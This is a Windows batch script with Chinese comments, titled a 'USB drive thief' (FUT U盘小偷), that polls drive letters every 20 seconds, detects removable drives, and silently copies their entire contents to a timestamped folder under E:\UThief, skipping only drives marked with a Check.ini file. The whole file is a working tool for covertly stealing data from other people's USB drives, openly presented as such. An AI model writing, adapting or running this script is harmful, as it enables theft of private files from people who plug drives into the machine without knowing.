@ECHO ON
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::    FUT U盘小偷  Code by Flyfish  2015-09-13  Author:Flyfish
::
::  功能：1、盗取任何插入你电脑的USB磁盘
::
::        2、能够自动检测U盘是否插入，每20秒检测一次
::
::        3、默认将盗取的文件保存在E盘UThief目录下，命名格式：年月日时分
::
::        4、能够设定多个保护U盘，受保护的U盘将不执行拷贝操作()
::
::        5、暂时仅支持单个设备复制(假如同时接入2个以上USB磁盘可能会有Bug)
::
::        6、暂无日志功能
::
::  更新历史：
::
::  2015.09.13  FUT v1.0，重构代码，添加设置受保护U盘功能
::
::  2014.07.19  USB小偷 ，实现基本功能
::

:AGAIN
DEL /F /Q "%TEMP%\FUT1.TMP"
DEL /F /Q "%TEMP%\FUT2.TMP"
FOR %%I IN (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) DO @FSUTIL FSINFO DRIVETYPE %%I: >>"%TEMP%\FUT1.TMP"
FINDSTR "可移动驱动器" "%TEMP%\FUT1.TMP" >"%TEMP%\FUT2.TMP"
IF ERRORLEVEL==1 CALL :Sleep 20

FOR /F "TOKENS=1" %%I IN ('FINDSTR /I "可移动驱动器" "%TEMP%\FUT2.TMP"') DO SET UDrive=%%I
DIR %UDrive%\Check.ini
IF ERRORLEVEL==1 GOTO GOON
IF ERRORLEVEL==0 CALL :Sleep 20

:GOON
ECHO D|XCOPY /R /G /E /C /Y  %UDrive%\*.* E:\UThief\%DATE:~0,4%%DATE:~5,2%%DATE:~8,2%%TIME:~0,2%%TIME:~3,2%
GOTO AGAIN

:Sleep
REM 若未检测到U盘，ping延时20s后继续检测！
REM ping持续占用内存2044KB！
ping 127.0.0.1 -n %1 > NUL
GOTO AGAIN